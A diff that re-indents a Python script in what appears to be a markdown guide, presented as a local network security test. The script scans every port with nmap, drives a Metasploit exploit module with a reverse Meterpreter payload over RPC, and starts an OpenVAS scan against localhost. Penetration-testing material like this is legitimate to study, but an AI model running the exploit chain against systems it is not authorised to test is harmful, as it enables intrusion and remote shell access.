@@ -101,79 +101,79 @@ Please note that these code snippets are simplified examples, and you would need
 Now, for a practical example, lets do a script un python for testing local network and neighbors:
 
   ```python
-import nmap
-from msfrpc import MsfRpcClient
-from gvm.connections import TLSConnection
-from gvm.protocols.gmp import Gmp
-from gvm.transforms import EtreeTransform
+    import nmap
+    from msfrpc import MsfRpcClient
+    from gvm.connections import TLSConnection
+    from gvm.protocols.gmp import Gmp
+    from gvm.transforms import EtreeTransform
 
-# Perform network scan using Nmap
-def perform_network_scan(target_ip):
-    scanner = nmap.PortScanner()
-    scanner.scan(target_ip, arguments='-p-')  # Scan all ports
+    # Perform network scan using Nmap
+    def perform_network_scan(target_ip):
+        scanner = nmap.PortScanner()
+        scanner.scan(target_ip, arguments='-p-')  # Scan all ports
 
-    open_ports = []
-    for host in scanner.all_hosts():
-        for proto in scanner[host].all_protocols():
-            for port in scanner[host][proto]:
-                if scanner[host][proto][port]['state'] == 'open':
-                    open_ports.append(port)
+        open_ports = []
+        for host in scanner.all_hosts():
+            for proto in scanner[host].all_protocols():
+                for port in scanner[host][proto]:
+                    if scanner[host][proto][port]['state'] == 'open':
+                        open_ports.append(port)
 
-    return open_ports
-
-# Exploit target using Metasploit Framework
-def exploit_target(target_ip, target_port):
-    client = MsfRpcClient('YOUR_METASPLOIT_API_TOKEN')
-    exploit_module = client.modules.use('exploit', 'exploit/multi/http/webdav_internal_ip')
-
-    exploit_module['RHOSTS'] = target_ip
-    exploit_module['RPORT'] = target_port
-
-    session = exploit_module.execute(payload='python/meterpreter/reverse_tcp')
-
-    return session
-
-# Initiate vulnerability scan using OpenVAS
-def initiate_vulnerability_scan(target_ip):
-    connection = TLSConnection(hostname='openvas_server', port=9390)
-    transform = EtreeTransform()
-
-    with Gmp(connection, transform=transform) as gmp:
-        gmp.authenticate('username', 'password')
-        scan_id = gmp.create_task(target=target_ip)
-
-        # Start the scan
-        gmp.start_task(scan_id)
-
-        return scan_id
-
-# Execute the scan, detect, and vulnerability check
-def execute_network_security_check(target_ip):
-    # Network scan using Nmap
-    open_ports = perform_network_scan(target_ip)
+        return open_ports
 
     # Exploit target using Metasploit Framework
-    session = exploit_target(target_ip, 80)  # Adjust the target port as needed
+    def exploit_target(target_ip, target_port):
+        client = MsfRpcClient('YOUR_METASPLOIT_API_TOKEN')
+        exploit_module = client.modules.use('exploit', 'exploit/multi/http/webdav_internal_ip')
+
+        exploit_module['RHOSTS'] = target_ip
+        exploit_module['RPORT'] = target_port
+
+        session = exploit_module.execute(payload='python/meterpreter/reverse_tcp')
+
+        return session
 
     # Initiate vulnerability scan using OpenVAS
-    scan_id = initiate_vulnerability_scan(target_ip)
+    def initiate_vulnerability_scan(target_ip):
+        connection = TLSConnection(hostname='openvas_server', port=9390)
+        transform = EtreeTransform()
 
-    # Save the outputs to separate TXT files
-    with open('network_scan_output.txt', 'w') as f:
-        f.write('Open Ports:\n')
-        for port in open_ports:
-            f.write(f'{port}\n')
+        with Gmp(connection, transform=transform) as gmp:
+            gmp.authenticate('username', 'password')
+            scan_id = gmp.create_task(target=target_ip)
 
-    with open('exploit_output.txt', 'w') as f:
-        f.write('Exploit Session:\n')
-        f.write(f'{session}\n')
+            # Start the scan
+            gmp.start_task(scan_id)
 
-    with open('vulnerability_scan_output.txt', 'w') as f:
-        f.write('Scan ID:\n')
-        f.write(f'{scan_id}\n')
+            return scan_id
 
-    print('Network security check completed. Results saved to TXT files.')
+    # Execute the scan, detect, and vulnerability check
+    def execute_network_security_check(target_ip):
+        # Network scan using Nmap
+        open_ports = perform_network_scan(target_ip)
 
-# Execute the script with your localhost IP as the target
-execute_network_security_check('localhost')
+        # Exploit target using Metasploit Framework
+        session = exploit_target(target_ip, 80)  # Adjust the target port as needed
+
+        # Initiate vulnerability scan using OpenVAS
+        scan_id = initiate_vulnerability_scan(target_ip)
+
+        # Save the outputs to separate TXT files
+        with open('network_scan_output.txt', 'w') as f:
+            f.write('Open Ports:\n')
+            for port in open_ports:
+                f.write(f'{port}\n')
+
+        with open('exploit_output.txt', 'w') as f:
+            f.write('Exploit Session:\n')
+            f.write(f'{session}\n')
+
+        with open('vulnerability_scan_output.txt', 'w') as f:
+            f.write('Scan ID:\n')
+            f.write(f'{scan_id}\n')
+
+        print('Network security check completed. Results saved to TXT files.')
+
+    # Execute the script with your localhost IP as the target
+    execute_network_security_check('localhost')
   ```
